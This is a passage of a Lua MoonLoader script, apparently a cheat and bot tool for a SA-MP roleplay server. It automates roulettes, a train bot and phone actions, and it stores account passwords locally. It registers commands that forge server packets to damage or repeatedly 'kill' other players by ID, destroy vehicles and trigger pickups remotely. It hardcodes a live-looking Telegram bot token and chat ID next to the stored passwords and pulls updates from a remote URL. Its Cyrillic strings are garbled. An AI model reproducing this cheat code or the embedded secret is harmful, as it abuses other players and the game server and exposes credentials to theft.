script_name('Freym-tech.xyz')
script_author("Freym")
script_version('8.6.2')

require('lib.moonloader')
local imgui = require('imgui')
local encoding = require("encoding")
local BitStreamIO = require 'lib.samp.events.bitstream_io'
local sampev = require("samp.events")
local idclose = '2110'
local pidarasfix = true
local grazhdankon = false
local run = false
--------fastphone-----------\
local games = 0
local pending_geo = nil
local phonecontactid = 0
local pending_msg = nil
local last_pending_msg = nil
local pending_superfast = false
local pending_superfast_sms = ''
local enterednum = -1
local last_entered = nil
local enterready = false
local invis = false
local sskin = false
local numbercallid = 0
local sms_received = false
local threadend = false
local threadendn = false
local callfornum = false
--------fastphone---------
--------all_bizinfo_finka--------
local all_bizinfo_finka_refresh = false
local tytfinka_new = 0
local tytfinka_old = 0
local tytbalance_new = 0
local tytbalance_old = 0


--------all_bizinfo_finka--------
--------refresh_tasks_farm-----------
local refresh_tasks_farm = false
local linenum = 0
local skip_after_update = false



--------refresh_tasks_farm-----------
--------train bot---------
local points = {
    [1] = {2864.75, 1329.0899658203, 12.125599861145};
    [2] = {1392.3271484375, 2632.25, 12.125599861145};
    [3] = {-37.1854,1292.9219,19.4452};
    [4] = {-1944.375, 82.024803161621, 27.000600814819};
    [5] = {831.7781,-1384.7006,-1.6452,227.1501}
}
traintrue = 'false'
--------train bot---------
local origdwa = 0
local stopopen = false
local opengateo = true
local jijapro = true
local memory = require("memory")
local effil = require("effil")
local samp = require 'lib.samp.events'
local inicfg = require("inicfg")
local telefongotov = false
local ffi = require('ffi')
local textdrawhide = false
local pizdaarz = true
local wm = require('lib.windows.message')
local ChatId = '732970207'
local Token = '1572901540:AAEH6PmsZ81uo9PeVrJRsu4bhNMaMFpbp4s'
local videokarta = false
local oX = -40
local oY = 430 
local reconwait = false
local spcars = ""
local activerender = 2
local lovlya_pickup = -1
local addcheck = true
local deposit = false
local activerender2 = 2
local numdwadawd = ""
local ignore_server_time = false
local lovlya_videokart = -1
local killplayer = false
local killid = 99999
local killiddelay = 250
local ggwdadw = ""
local strahovoypickup = 0
local idcarspawnfix = 0
local larciwt = 0
local videokartiwt = 0
local lovlya = false
local v_lovlya = false
local idpickup_destroy = -1
local v_idpickup_destroy = -1
local miningtool = true
local automining_status = false
local automining_getbtc = 0
local automining_startall = 0
local automining_fillall = 0
local oxladtime = 224 
local fastphoneen = false
local INFO = { 
    0.029999,
    0.059999,
    0.09,
    0.11999,
    0.15,
    0.18,
	0.209999,
	0.239999,
	0.27,
	0.3
}
math.randomseed(os.clock())
local dtext = {}
local dtextd = {}
local stopp = false
local vhodbonus = false
local counter = {}
local finished = true
local checktochilki = false
local checked_radio = imgui.ImInt(1)
local checked_box = imgui.ImBool(false)
local autosunduk = false
local turnupdatekarta = true
local tbl = 0
local processoplatafami = false
local oplatafami = false
local tbl2 = 0
tex1t = renderCreateFont('Tahoma', 10, 5)
salary = renderCreateFont('Tahoma', 20, 5)
salary2 = renderCreateFont('Tahoma', 10, 5)
local sendmoneyperedayy = false
is_opening = false
encoding.default = 'CP1251'
u8 = encoding.UTF8


if not doesDirectoryExist('moonloader/config') then
	createDirectory('moonloader/config')
end

local q = "moonloader/config/ruletkisumm.ini"
if not doesFileExist(q) then q1 = io.open(q, "a") q1:write("[ruletkisumm]\n1=1") q1:close() end
local rullsumm = inicfg.load(nil, q)

local path = getGameDirectory() .. "\\moonloader\\config"
local file = path .. "\\accs.json"
dialogChecker = {
	check = false,
	id = -1,
	title = ""
}
editpass = {
	numedit = -1,
	input = imgui.ImBuffer('',500)
}
temppass = {}
savepass = {}
if doesFileExist(file) then
	local f = io.open(file, "r")
	if f then
		savepass = decodeJson(f:read("a*"))
		f:close()
	end
end

-- local maininib = inicfg.load({   
--     trainbotsettings =
--     {
-- 		status = false;
-- 		state = false;
-- 		flights = 0;
-- 		earn = 0;
-- 		pickUp = nil;
-- 		point = '�� ���������';
-- 		speed = 47;
-- 		dist = 190;
-- 		wait = 1000;
-- 		boostSpeed = true;
--     }
-- 	}, "trainbotsettings")
-- inicfg.save(maininib, 'trainbotsettings.ini') 
-- if not doesFileExist('moonloader/config/trainbotsettings.ini') then
-- 	inicfg.save(maininib,'trainbotsettings.ini')
-- end

local info = {
    status = false;
    state = false;
    flights = 0;
    earn = 0;
    pickUp = nil;
    point = '�� ���������';
    speed = 47;
    dist = 190;
    wait = 1000;
	boostint = 0.4;
	faststopspeed = 1;
    boostSpeed = true;
}
local sliders = {
	slider1 = imgui.ImFloat(info['dist']),
	slider2 = imgui.ImFloat(info['boostint']),
	slider3 = imgui.ImFloat(info['speed']),
	slider4 = imgui.ImFloat(info['faststopspeed']),
}

local mainIni = inicfg.load({
	autologin = {
		state = false
	},
	arec ={
		randomnumberconnect1 = 1500,
		randomnumberconnect2 = 2500,
		state = false,
		wait = 50,
		sizemenu = 880,
		combobombo1 = 0,
		combobombo2 = 0,
		viborserveraedit = 0
	},
	roulette = {
		standart = false,
		donate = false,
		platina = false,
		ilon = false,
		lossantos = false,
		videokarta = false,
		--valentin = false,
		firstlinefirstnumber = 228,
		firstlinetwnumber = 228,
		firstlinefirstnumberr = 221,
		firstlinetwnumberr = 221,
		wait = 1000,
		wait1 = 14,
		wait2 = 10,
		backgroundmenu = 100,
		bitcoinandeurox = 350,
		dtimerosx = 220,
		checked_radiofwafwa = 2,
		dtimerosy = 220,
		bitcoinandeuroy = 1050,
		timerspx = 20,
		strokadlyafulladepa = 7,
		timerspy = 400
	},
	piar = {
		piar1 = '',
		piar2 = '',
		piar3 = '',
		piarwait = 50,
		piarwait2 = 50,
		piarwait3 = 50
	},
	eat = {
		setmetod = 0,
        eatmetod = 0,
        healstate = false,
        hplvl = 30,
        hpmetod = 0,
        arztextdrawid = '648',
        arztextdrawidheal = '646',
        drugsquen = '1'
	},
	config = {
		whoru = '',
		helicoptervintiw = false,
		limitdorogalvw = false,
		fixelploitmaverw = false,  
		inputefixw = false, 
		waveccw = false,
		fixvrw = false,
		settingsperedaiw = false,
		zhdputiw = false, 
		stolbiw = false, 
		settingszatochkaw = false,
		banscreen = false,
		autopassw = false,
		troplataw = false, 
		changercarsettingsw = false, 
		depositfillw = false,  
		ctimew = false,
		sprintw = false,
		oplatafamkvw = false, 
		autoriletkiw = false, 
		statsrulw = false,
		launcherplayerw = false,
		spcarstimew = false,
		kurseurow = false,
		kursbitcoinw = false,
		mavericsharw = false,
		arizonavhodw = false,
		dualmonitorw = false,
		unloadpedsw = false,
		unloadcarsw = false,
		settingsunloadw = false,
		skipzzw = false,
		safemodew = false,
		clreconw = false,
		autorollrulw = false, 
		shlagbaumw = false,
		sharw = false,
		antilomkaw = false,
		ttactivew = false,
		settingspatcherw = false,
		checked_boxw = false, 
		enableperedaiw = false, 
		enablefirstlinew = false,
		enablefirstlineew = false,
		launchermobilew = false,
		launcheroffw = false,
		launcherpcw = false,
		password = '',
		sellcenabronse = '0',
		sellcenacarbox = '0',
		sellcenagold = '0',
		sellcenaplatina = '0',
		sellcenaprem = '0', 
		sellcenaoli = '0',
		sellcenasera = '0',
		summperedai = '0',
		idperedai = '0',
		antiafk = false
	}
},'afktools.ini')
if not doesFileExist('moonloader/config/afktools.ini') then
	inicfg.save(mainIni,'afktools.ini')
end



-- local mainIninote = inicfg.load({
-- 	config = {
-- 		notepadafk = ''
-- 	}
-- },'afktoolsnote.ini')
-- if not doesFileExist('moonloader/config/afktoolsnote.ini') then
-- 	inicfg.save(mainIninote,'afktoolsnote.ini')
-- end
local afksets = imgui.ImBool(false)
local showpass = false
local showtoken = false
aopen = false
mopen = false
opentimerid = {
	standart = -1,
	platina = -1,
	ilon = -1,
	lossantos = -1,
	videokarta = -1,
	--valentin = -1,
	donate = -1
}
checkopen = {
	standart = false,
	videokarta = false,
	--valentin = false,	
	donate = false
}

local whoru = imgui.ImBuffer(''..mainIni.config.whoru, 256)
local helicoptervinti = imgui.ImBool(mainIni.config.helicoptervintiw) 
local settingsperedai = imgui.ImBool(mainIni.config.settingsperedaiw) 
local fixvr = imgui.ImBool(mainIni.config.fixvrw) 
local limitdorogalv = imgui.ImBool(mainIni.config.limitdorogalvw) 
local fixelploitmaver = imgui.ImBool(mainIni.config.fixelploitmaverw) 
local inputefix = imgui.ImBool(mainIni.config.inputefixw) 
local wavecc = imgui.ImBool(mainIni.config.waveccw)
local zhdputi = imgui.ImBool(mainIni.config.zhdputiw)  
local stolbi = imgui.ImBool(mainIni.config.stolbiw) 
local settingszatochka = imgui.ImBool(mainIni.config.settingszatochkaw)
local checked_box = imgui.ImBool(mainIni.config.checked_boxw) 
local enableperedai = imgui.ImBool(mainIni.config.enableperedaiw) 
local enablefirstline = imgui.ImBool(mainIni.config.enablefirstlinew) 
local enablefirstlinee = imgui.ImBool(mainIni.config.enablefirstlineew) 
local ttactive = imgui.ImBool(mainIni.config.ttactivew) 
local settingspatcher = imgui.ImBool(mainIni.config.settingspatcherw)
local launchermobile = imgui.ImBool(mainIni.config.launchermobilew)
local launcheroff = imgui.ImBool(mainIni.config.launcheroffw)
local launcherpc = imgui.ImBool(mainIni.config.launcherpcw)
local troplata = imgui.ImBool(mainIni.config.troplataw)  
local changercarsettings = imgui.ImBool(mainIni.config.changercarsettingsw)
local depositfill = imgui.ImBool(mainIni.config.depositfillw)   
local ctime = imgui.ImBool(mainIni.config.ctimew)
local sprint = imgui.ImBool(mainIni.config.sprintw)
local oplatafamkv = imgui.ImBool(mainIni.config.oplatafamkvw) 
local autoriletki = imgui.ImBool(mainIni.config.autoriletkiw) 
local launcherplayer = imgui.ImBool(mainIni.config.launcherplayerw)
local statsrul = imgui.ImBool(mainIni.config.statsrulw)
local spcarstime = imgui.ImBool(mainIni.config.spcarstimew)
local kurseuro = imgui.ImBool(mainIni.config.kurseurow) 
local kursbitcoin = imgui.ImBool(mainIni.config.kursbitcoinw)  
local mavericshar = imgui.ImBool(mainIni.config.mavericsharw)
local arizonavhod = imgui.ImBool(mainIni.config.arizonavhodw) 
local dualmonitor = imgui.ImBool(mainIni.config.dualmonitorw)
local unloadpeds = imgui.ImBool(mainIni.config.unloadpedsw)
local unloadcars = imgui.ImBool(mainIni.config.unloadcarsw)
local settingsunload = imgui.ImBool(mainIni.config.settingsunloadw)
local skipzz = imgui.ImBool(mainIni.config.skipzzw)   
local safemode = imgui.ImBool(mainIni.config.safemodew)
local clrecon = imgui.ImBool(mainIni.config.clreconw)
local autorollrul = imgui.ImBool(mainIni.config.autorollrulw)
local shlagbaum = imgui.ImBool(mainIni.config.shlagbaumw)
local shar = imgui.ImBool(mainIni.config.sharw)
local antilomka = imgui.ImBool(mainIni.config.antilomkaw)
local autopass = imgui.ImBool(mainIni.config.autopassw)
local summperedai = imgui.ImBuffer(''..mainIni.config.summperedai, 256)
local idperedai = imgui.ImBuffer(''..mainIni.config.idperedai, 256)  
local pass = imgui.ImBuffer(''..mainIni.config.password, 256) 
local sellcenabronse  = imgui.ImBuffer(''..mainIni.config.sellcenabronse, 256) 
local sellcenasera = imgui.ImBuffer(''..mainIni.config.sellcenasera, 256) 
local sellcenaplatina = imgui.ImBuffer(''..mainIni.config.sellcenaplatina, 256) 
local sellcenagold = imgui.ImBuffer(''..mainIni.config.sellcenagold, 256) 
local sellcenacarbox = imgui.ImBuffer(''..mainIni.config.sellcenacarbox, 256) 
local sellcenaoli = imgui.ImBuffer(''..mainIni.config.sellcenaoli, 256)
local sellcenaprem = imgui.ImBuffer(''..mainIni.config.sellcenaprem, 256)
local antiafk = imgui.ImBool(mainIni.config.antiafk)
-- local banscreen = imgui.ImBool(mainIni.config.banscreen)
-- local notepadafk = imgui.ImBuffer(''..mainIninote.config.notepadafk, 1256)
local checkfrac ={u8'����������� ����', u8'������ 1',u8'������ 2',u8'������ 3',u8'������ 4',u8'������ 5',u8'������ 6',u8'������ 7',u8'������ 8'}
local launchermobilechoose ={u8'��� ��������', u8'��������� �������',u8'PC-�������'}
local namesserveredit ={u8'Phoenix (01)', u8'Tucson (02)',u8'Scottdale (03)',u8'Chandler (04)',u8'Brainburg (05)',u8'Saint Rose (06)',u8'Mesa (07)',u8'Red-Rock (08)',u8'Yuma (09)',u8'Surprise (10)',u8'Prescott (11)',u8'Glendale (12)',u8'Kingman (13)',u8'Winslow (14)',u8'Payson (15)',u8'Gilbert (16)',u8'Show-Low (17)',u8'Casa-Grande (18)'}
local balls = {
	[19332] = {3, 3}, 		
	[19333] = {152, 152}, 
	[19334] = {1, 1}, 		
	[19335] = {152, 6}, 
	[19336] = {126, 1}, 	
	[19337] = {243, 6}, 
	[19338] = {243, 3}, 	
}
local shlagbaumid = {968}
local stolbiid = {1226 , 1284 , 1283 , 1334 , 1331 , 1294 , 1297 , 1290, 1350, 18880, 1351, 1315, 1374, 1373, 1676, 1333, 3594, 3050, 3666}
goscreen = false
local autologin = {
	state = imgui.ImBool(mainIni.autologin.state)
}
local arec = {
	state = imgui.ImBool(mainIni.arec.state),
	wait = imgui.ImInt(mainIni.arec.wait),
	sizemenu = imgui.ImInt(mainIni.arec.sizemenu),
	randomnumberconnect1 = imgui.ImInt(mainIni.arec.randomnumberconnect1),
	randomnumberconnect2 = imgui.ImInt(mainIni.arec.randomnumberconnect2),
	combobombo1 = imgui.ImInt(mainIni.arec.combobombo1),
	combobombo2 = imgui.ImInt(mainIni.arec.combobombo2),
	viborserveraedit = imgui.ImInt(mainIni.arec.viborserveraedit)
}
local roulette = {
	standart = imgui.ImBool(mainIni.roulette.standart),
	videokarta = imgui.ImBool(mainIni.roulette.videokarta), 
	donate = imgui.ImBool(mainIni.roulette.donate),
	platina = imgui.ImBool(mainIni.roulette.platina),
	ilon = imgui.ImBool(mainIni.roulette.ilon),
	lossantos = imgui.ImBool(mainIni.roulette.lossantos),
	--valentin = imgui.ImBool(mainIni.roulette.valentin),
	wait = imgui.ImInt(mainIni.roulette.wait),
	wait1 = imgui.ImInt(mainIni.roulette.wait1),
	backgroundmenu = imgui.ImInt(mainIni.roulette.backgroundmenu),
	bitcoinandeurox = imgui.ImInt(mainIni.roulette.bitcoinandeurox),
	firstlinetwnumber = imgui.ImInt(mainIni.roulette.firstlinetwnumber),
	firstlinefirstnumber = imgui.ImInt(mainIni.roulette.firstlinefirstnumber),
	firstlinetwnumberr = imgui.ImInt(mainIni.roulette.firstlinetwnumberr),
	firstlinefirstnumberr = imgui.ImInt(mainIni.roulette.firstlinefirstnumberr),
	dtimerosx = imgui.ImInt(mainIni.roulette.dtimerosx), 
	checked_radiofwafwa = imgui.ImInt(mainIni.roulette.checked_radiofwafwa),
	dtimerosy = imgui.ImInt(mainIni.roulette.dtimerosy), 
	bitcoinandeuroy = imgui.ImInt(mainIni.roulette.bitcoinandeuroy),
	timerspx = imgui.ImInt(mainIni.roulette.timerspx), 
	strokadlyafulladepa = imgui.ImInt(mainIni.roulette.strokadlyafulladepa),
	timerspy = imgui.ImInt(mainIni.roulette.timerspy),
	wait2 = imgui.ImInt(mainIni.roulette.wait2)
}
piar = {
	piar1 = imgui.ImBuffer(''..mainIni.piar.piar1, 500),
	piar2 = imgui.ImBuffer(''..mainIni.piar.piar2, 500),
	piar3 = imgui.ImBuffer(''..mainIni.piar.piar3, 500),
	piarwait = imgui.ImInt(mainIni.piar.piarwait),
	piarwait2 = imgui.ImInt(mainIni.piar.piarwait2),
	piarwait3 = imgui.ImInt(mainIni.piar.piarwait3)
}
local eatmetod = imgui.ImInt(mainIni.eat.eatmetod)
local arztextdrawid = imgui.ImBuffer(''..mainIni.eat.arztextdrawid, 10)
local arztextdrawidheal = imgui.ImBuffer(''..mainIni.eat.arztextdrawidheal, 10)
local setmetod = imgui.ImInt(mainIni.eat.setmetod)
local hpmetod = imgui.ImInt(mainIni.eat.hpmetod)
local healstate = imgui.ImBool(mainIni.eat.healstate)
local hplvl = imgui.ImBuffer(''..mainIni.eat.hplvl, 4)
local drugsquen = imgui.ImBuffer(''..mainIni.eat.drugsquen, 3)

local metod = {
	u8'�����',
	u8'����',
	u8'�������',
	u8'TextDraw',
	u8'�����'
}
local healmetod = {
	u8'�������',
	u8'���������',
	u8'����������',
	u8'����',
	u8'TextDraw'
}
imgui.BlockElements = function(title, elements)
	imgui.Separator() 
	imgui.CenterText(title)
	imgui.Separator()
	elements()
end 
local newcount = ' '
local font = renderCreateFont('Arial', 10, 9)
font2 = renderCreateFont('Arial', 8, 5)
AFKMessage = function(text) 
	sampAddChatMessage('[Freym-tech] {ffffff}'..text,0xFF4141) 
end
menunum = 0 
menufill = 0 
localvalue = 0
local key, server, ts

ffi.cdef [[
	typedef unsigned long HANDLE;
	typedef HANDLE HWND;
	typedef struct _RECT {
		long left;
		long top;
		long right;
		long bottom;
	} RECT, *PRECT;

	HWND GetActiveWindow(void);

	bool GetWindowRect(
		HWND   hWnd,
		PRECT lpRect
	);

	bool ClipCursor(const RECT *lpRect);

	bool GetClipCursor(PRECT lpRect);
]]

local rcClip, rcOldClip = ffi.new('RECT'), ffi.new('RECT')

function threadHandle(runner, url, args, resolve, reject) -- ��������� effil ������ ��� ����������
	local t = runner(url, args)
	local r = t:get(0)
	while not r do
		r = t:get(0)
		wait(0)
	end
	local status = t:status()
	if status == 'completed' then
		local ok, result = r[1], r[2]
		if ok then resolve(result) else reject(result) end
	elseif err then
		reject(err)
	elseif status == 'canceled' then
		reject(status)
	end
	t:cancel(0)
end

function requestRunner() -- �������� effil ������ � �������� https �������
	return effil.thread(function(u, a)
		local https = require 'ssl.https'
		local ok, result = pcall(https.request, u, a)
		if ok then
			return {true, result}
		else
			return {false, result}
		end
	end)
end


function async_http_request(url, args, resolve, reject)
	local runner = requestRunner()
	if not reject then reject = function() end end
	lua_thread.create(threadHandle,runner, url, args, resolve, reject)
end



function char_to_hex(str)
	return string.format("%%%02X", string.byte(str))
  end
  
function url_encode(str)
    local str = string.gsub(str, "\\", "\\")
    local str = string.gsub(str, "([^%w])", char_to_hex)
    return str
end

function openchestrullet()
	if sampIsLocalPlayerSpawned() then
		if roulette.standart.v or roulette.donate.v or roulette.platina.v or roulette.ilon.v or roulette.lossantos.v then 
			aopen = not aopen
			AFKMessage('������������ '..(aopen and '��������!' or '���������!'))
			if aopen then 
				rulethandle = lua_thread.create(checkrulopen)
				afksets.v = false
			else 
				lua_thread.terminate(rulethandle) 
			end
		else
			AFKMessage("�������� ������ � ���������!")
		end
	else
		AFKMessage("��� �������� �� ���������!")
	end
end
function funckthisshit()
	if sampIsLocalPlayerSpawned() then
		if roulette.standart.v or roulette.donate.v or roulette.platina.v or roulette.ilon.v or roulette.lossantos.v then
			if not aopen then 
				aopen = true
				rulethandle = lua_thread.create(checkrulopen)
				afksets.v = false
			else
				AFKMessage("������� ��� �������� � �������������!")
			end
		else
			AFKMessage("�������� ������ � ���������!")
		end
	else
		AFKMessage("��� �������� �� ���������!")
	end
end


function openchestrullet1()
	if sampIsLocalPlayerSpawned() then
		if roulette.videokarta.v then
			mopen = not mopen
			AFKMessage('������������� '..(mopen and '��������!' or '���������!'))
			if mopen then 
				rulethandlee = lua_thread.create(checkrulopen1)
				afksets.v = false
			else 
				lua_thread.terminate(rulethandlee) 
			end
		else
			AFKMessage("�������� �������������!")
		end
	else
		AFKMessage("�������� �������������!")
	end
end


bizpiaron = false
local health = 2000

function main()
    while not isSampAvailable() do
        wait(0)
	end
	ffi.C.GetWindowRect(ffi.C.GetActiveWindow(), rcClip);
  	ffi.C.ClipCursor(rcClip);
	autoupdate('https://raw.githubusercontent.com/Freym177/tools/main/updateafktools.js','##nil','https://raw.githubusercontent.com/Freym177/tools/main/updateafktools.js')
	workpaus(antiafk.v)
	
	sampRegisterChatCommand('ms',function() afksets.v = not afksets.v end) --��������� ��������
	-------------------fastphone-------------------
	sampRegisterChatCommand("call",lgbt1) 
	sampRegisterChatCommand("calln",lgbt2) 
	sampRegisterChatCommand("sms", on_fastssms) 
	sampRegisterChatCommand("ssms", on_superfast_sms) 
	sampRegisterChatCommand("geo", on_fastgeo) 
	
	sampRegisterChatCommand("setphone", function()
		sampShowDialog(10000, "{FFFFFF}��������� {FFFF00}FastPhone {FFFFFF}(������ �������: {FFFF00}"..whoru.v.."{FFFFFF})", "{FFFFFF}������� ����� �������� � ������ {FF9933}������� ����������� ����{FFFFFF}.\n{FFFFFF}1. IPHONE X\n2. Samsung Galaxy S10\n3. Google Pixel 3\n4. Huawei P20 PRO\n5. Xiaomi Mi 8", "�������", "�������", 1)
	end)
	sampRegisterChatCommand("phonehelp", function()
		sampShowDialog(1337, "{FFFFFF}������� {FFFF00}FastPhone", "{00ffff}�������.\t{00ffff}��������.\n{00ffff}/call\t {00ffff}��������� �������� �� ��� id (/call id)\n{00ffff}/setphone\t {00ffff}��������� ������� ������� �� ������ ������������.\n{00ffff}/calln\t {00ffff}��������� �������� �� ������ �������� (/calln ����� ��������)\n{00ffff}/sms\t {00ffff}(/sms ������� ��� �������� � ���������)(/sms id ��� �������� �������� ������� � ��������� �� ��� id).\n{00ffff}/ssms\t {00ffff}�������� ��� �� id �������� (/ssms id ���������).\n{00ffff}/geo\t {00ffff}����������� ���������� �������� �� ��� id (/geo id).\n{00ffff}/safemode\t {00ffff}������ ��������� �������� ���������� �������������� ������� ���� ��� �� �������� �� ���������.", "�����", false, 5)
	end)
	
	sampRegisterChatCommand("safemode", function() 
		safemode.v = not safemode.v
		if safemode.v then
			AFKMessage("�� {72e232}�������� {FFFF00}������� ���{FFFFFF}. ������ ��� �������� {FFFF00}������� ������{FFFFFF}, �� {FFFF00}����������.")
		else
			AFKMessage("�� {e23c37}�������� {FFFF00}������� ���{FFFFFF}. ������ ��� �������� {FFFF00}������{FFFFFF}, �� �� {FFFF00}���������.")
		end
		saveini()
	end)
	-------------------fastphone-------------------
	
	sampRegisterChatCommand('delveh', function(arg)
        if tonumber(arg) ~= nil then
            result, vehHandle = sampGetCarHandleBySampVehicleId(tonumber(arg))
            if result then
                deleteCar(vehHandle)
            end
        end
    end) 
	sampRegisterChatCommand('upp', function(arg)
        if tonumber(arg) ~= nil then
            sampSendPickedUpPickup(arg)
			pressaltnow = true
			AFKMessage('gotovo, pickuped: '..arg)
		else
			AFKMessage('use /upp id to pickup')
        end
    end)
	sampRegisterChatCommand('work', function(arg)
        if tonumber(strahovoypickup) ~= 0 then
            sampSendPickedUpPickup(strahovoypickup)
			pressaltnow = true
			AFKMessage('gotovo, pickuped: '..strahovoypickup)
		else
			AFKMessage('����������� � �������� ��� ������� ������')
        end
    end)
	sampRegisterChatCommand('destroycar', function(arg)
        if tonumber(arg) ~= nil then
			-- result = placeWaypoint(-4771.3008,5203.2813,13.8007)
			sampSendVehicleDestroyed(arg)
			AFKMessage('destroyed car '..arg)
		else
			AFKMessage('use /destroycar id to destroy car')
        end
    end)
	sampRegisterChatCommand('zdmg', function(arg)
        if tonumber(arg) ~= nil then
            sampSendGiveDamage(arg, 6.6000003814697, 0, 6)
			AFKMessage('gotovo, damaged id: '..arg)
		else
			
			AFKMessage('use /zdmg id to damage')
        end
    end)
	sampRegisterChatCommand('killid', function(arg)
        if tonumber(arg) ~= nil then

			killid = arg
			killplayer = not killplayer
            -- sampSendGiveDamage(arg, 6.6000003814697, 0, 6)
			AFKMessage('killid: '..killid)
			AFKMessage('killplayer: '..tostring(killplayer) )
		else
			
			AFKMessage('use /killid id to damage')
        end
    end) 
	sampRegisterChatCommand('killwait', function(arg)
        if tonumber(arg) ~= nil then
			killiddelay = arg
			AFKMessage('killwait: '..tostring(killiddelay))
		else
			AFKMessage('use /killwait id to damage')
        end
    end)
	sampRegisterChatCommand('killme', function()
		dibil()
		AFKMessage('+')
    end)
	
	-- sampRegisterChatCommand('tvideo', function()
	-- 	videokartiwt = 10
    -- end)
	sampRegisterChatCommand('video', function()
		if lovlya_videokart ~= -1 then
			v_lovlya = not v_lovlya
			if v_lovlya then
				AFKMessage('������ ����� Videokarti!')
				v_pickup_x, v_pickup_y, v_pickup_z = getCharCoordinates(playerPed)
				_, v_idpickup_destroy = createPickup(1277, 32, v_pickup_x, v_pickup_y, v_pickup_z)
			else
				awdafffwfdawd, dwaffffdafwfwwd, addwdawffdawdawada = getPickupCoordinates(v_idpickup_destroy)
				if v_idpickup_destroy ~= -1 and awdafffwfdawd ~= 0 and dwaffffdafwfwwd ~= 0 then 
					removePickup(v_idpickup_destroy)
				end
				AFKMessage('�������� ����� Videokarti!!!')
			end
		else
			AFKMessage('����������� � ���� ��� ������� ������! � ��� �� ���� � ������ ������!')
		end
    end)
	sampRegisterChatCommand('tlarec', function()
		larciwt = 10
    end)
	sampRegisterChatCommand('sskin', function()
		sskin = not sskin
		AFKMessage(tostring(sskin))
    end)
	sampRegisterChatCommand('larec', function()
		if lovlya_pickup ~= -1 then
			lovlya = not lovlya
			if lovlya then
				AFKMessage('������ ����� �����!')
				pickup_x, pickup_y, pickup_z = getCharCoordinates(playerPed)
				_, idpickup_destroy = createPickup(1550, 32, pickup_x, pickup_y, pickup_z)
			else
				awdafffwdawd, dwaffffdawd, addwdawdawdawada = getPickupCoordinates(idpickup_destroy)
				if idpickup_destroy ~= -1 and awdafffwdawd ~= 0 and dwaffffdawd ~= 0 then 
					removePickup(idpickup_destroy)
				end
				AFKMessage('�������� ����� �����!!!')
			end
		else
			AFKMessage('����������� �� �� ��� ������� ������! � ��� �� ���� � ������ ������!')
		end
    end)
	sampRegisterChatCommand('disconnect',function()
		sampDisconnectWithReason(quit)
	end)
	sampRegisterChatCommand('shar',function()
		sampSendChat('/balloon')
	end)
	sampRegisterChatCommand('sp',function()
		sampSendChat('/setspawn')
	end)
	-- sampRegisterChatCommand('site', function()
	-- 	local httpss = require('ssl.https')
	-- 	local res = https.request('https://raw.githubusercontent.com/Freym177/tools/main/updateafktools.js')
	-- 	AFKMessage(tostring(res))
    -- end)
	sampRegisterChatCommand("hpcar", function(args)
        if not isCharInAnyCar(PLAYER_PED) then
            return sampAddChatMessage('���� � ����, �����.', -1)
        end

        local vehicle = storeCarCharIsInNoSave(PLAYER_PED)
		AFKMessage(vehicle)
        local health = tonumber(args)

        if health == nil then
            return
        end

        if getCarHealth(vehicle) == health then
			sampAddChatMessage('� ���������� � ��� ������� ��������.',-1)
            return 
        end
        setCarHealth(vehicle, health)
    end)
	sampRegisterChatCommand("st", cmdSetTime)
  	sampRegisterChatCommand("sw", cmdSetWeather)
	sampRegisterChatCommand('dell',function()
		sampSendClickTextdraw(2302)
		sampSendClickTextdraw(2302)
		sampSendClickTextdraw(2302)
		sampSendClickTextdraw(2302)
		sampSendClickTextdraw(2302)
		sampSendClickTextdraw(2302)
		sampSendClickTextdraw(2302)
		sampSendClickTextdraw(2302)
		sampSendClickTextdraw(2302)
		sampSendClickTextdraw(2302)
		sampSendClickTextdraw(2302)
		sampSendClickTextdraw(2302)
		sampSendClickTextdraw(2302)
		sampSendClickTextdraw(2302)
		sampSendClickTextdraw(2302)
		sampSendClickTextdraw(2302)
		sampSendClickTextdraw(2302)
		sampSendClickTextdraw(2302)
		sampSendClickTextdraw(2302)
		sampSendClickTextdraw(2302)
		sampSendClickTextdraw(2302)
		sampSendClickTextdraw(2302)
		sampSendClickTextdraw(2302)
		sampSendClickTextdraw(2302)
		sampSendClickTextdraw(2302)
		sampSendClickTextdraw(2302)
		sampSendClickTextdraw(2302)
		sampSendClickTextdraw(2302)
		sampSendClickTextdraw(2302)
		sampSendClickTextdraw(2302)
		sampSendClickTextdraw(2302)
		sampSendClickTextdraw(2302)
		sampSendClickTextdraw(2302)
		sampSendClickTextdraw(2302)
	end)
	AFKMessage('������� ���� - /ms ��� ������ ������� Insert. �����: Freym. Have a nice day!')
	AFKMessage("� � ��� �������� {FFFF00}FastPhone{FFFFFF}. ��� �� ������� ������� ��������� {FFFF00}/setphone")
	AFKMessage("��� �� ����������� {FFFF00}������� �������{FFFFFF} ��������� ������� {FFFF00}/phonehelp{FFFFFF}.")
	-- fastconnectupd()
	createcfgifnotcfg()	
	applySampfuncsPatch()

    while true do 
		if stswtime then
			setTimeOfDay(stswtime, 0)
		end
		-------------------------------------------------------------------FASTPHONE------------------------------------------------------------------------------
		local result, button, _, input = sampHasDialogRespond(10000)
		if result and button == 0 then
			AFKMessage("�� ������� �����:{FFFF00} ������� ���� � ���������� ��������{FFFFFF}. ������� ������� - {FFFF00}/setphone")
		end
		if result and button == 1 and input ~= "" then
			input = tonumber(input)
			if input ~= nil then
				if (input < 6) and (input > 0) then
					if input == 1 then
						whoru.v = 'IPHONE X'
					elseif input == 2 then
						whoru.v = 'Samsung Galaxy S10'
					elseif input == 3 then
						whoru.v = 'Google Pixel 3'
					elseif input == 4 then
						whoru.v = 'Huawei P20 PRO'
					elseif input == 5 then
						whoru.v = 'Xiaomi Mi 8'
					end
					AFKMessage("�� ������� �����: {FFFF00}"..input..". "..whoru.v.."{FFFFFF}. ��� �� ������� ������� ��������� {FFFF00}/setphone")
					saveini()
				else
					sampShowDialog(10000, "{FFFFFF}��������� {FFFF00}FastPhone {FFFFFF}(������ �������: {FFFF00}"..whoru.v.."{FFFFFF})", "{FFFFFF}������� ����� �������� � ������ {FF9933}������� ����������� ����{FFFFFF}.\n{FFFFFF}1. IPHONE X\n2. Samsung Galaxy S10\n3. Google Pixel 3\n4. Huawei P20 PRO\n5. Xiaomi Mi 8\n{FF4141}�� ����� �������� ����� "..input..", ������ ���� ��������� ����!!!!", "�������", "�������", 1)
				end
			end
		end
		if threadend then
			lua_thread.terminate(numbercalll)
			threadend = false
		end
		if threadendn then
			lua_thread.terminate(numbercallln)
			threadendn = false
		end
		-------------------------------------------------------------------FASTPHONE------------------------------------------------------------------------------
		wait(0)
		
        imgui.Process = afksets.v
		imgui.ShowCursor = afksets.v
		if lovlya then
			for k, v in ipairs(counter) do 
				if (os.clock() - v) > 1.0 then 
					table.remove(counter, k)
				end
			end
